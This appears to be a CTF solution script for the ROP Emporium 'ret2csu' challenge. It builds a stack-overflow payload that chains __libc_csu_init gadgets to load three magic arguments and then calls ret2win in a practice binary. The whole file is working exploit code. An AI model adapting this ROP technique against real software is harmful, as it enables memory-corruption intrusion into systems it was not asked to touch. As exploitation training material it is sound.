#!/usr/bin/python3
from ctypes import *
import sys

CSU_WRITE_REGS=0x40069a
CSU_MAGIC_CALL=0x400680 # R15 -> RDX, R14 -> RSI, R13D -> EDI, call [R12 + RBX*0x8]
PLT_RET2WIN=0x400510
POP_RDI=0x4006a3
PTR_CSU_FINI=0x600e48

MAGIC1 = 0xdeadbeefdeadbeef
MAGIC2 = 0xcafebabecafebabe
MAGIC3 = 0xd00df00dd00df00d

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

def write_rdi(rdi):
    write_call(POP_RDI)
    write_ints([rdi])

def write_regs1(rbx, rbp, r12, r13, r14, r15):
    write_call(CSU_WRITE_REGS)
    write_ints([rbx, rbp, r12, r13, r14, r15])

write_offset()

write_regs1(0, 1, PTR_CSU_FINI, MAGIC1, MAGIC2, MAGIC3)
write_call(CSU_MAGIC_CALL)
write_ints([0]) # padding
write_ints([0, 0, 0, 0, 0, 0])
write_rdi(MAGIC1)
write_call(PLT_RET2WIN)
